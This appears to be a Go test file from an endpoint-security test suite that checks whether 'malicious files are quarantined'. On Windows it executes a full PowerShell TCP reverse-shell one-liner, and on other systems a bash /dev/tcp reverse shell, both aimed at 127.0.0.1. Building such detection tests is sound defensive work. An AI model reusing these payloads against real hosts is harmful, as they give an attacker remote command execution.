/*
NAME: c521b330-70eb-4c4d-b748-a8869a7bac4c.go
RULE: Malicious files are quarantined
CREATED: 2023-01-03
*/
package main

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
)

func check(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func test() {
	if runtime.GOOS == "windows" {
		mal := "$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',1);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
		if _, err := exec.Command("powershell.exe", mal).Output(); err != nil {
			os.Exit(101)
		} else {
			os.Exit(100)
		}
	} else {
		mal := "bash -i >& /dev/tcp/127.0.0.1/40000 0>&1"
		if _, err := exec.Command("/bin/bash", "-c", mal).Output(); err != nil {
			os.Exit(101)
		} else {
			os.Exit(100)
		}
	}
}

func clean() {
	fmt.Println("Cleaned")
	os.Exit(100)
}

func main() {
	test()
}
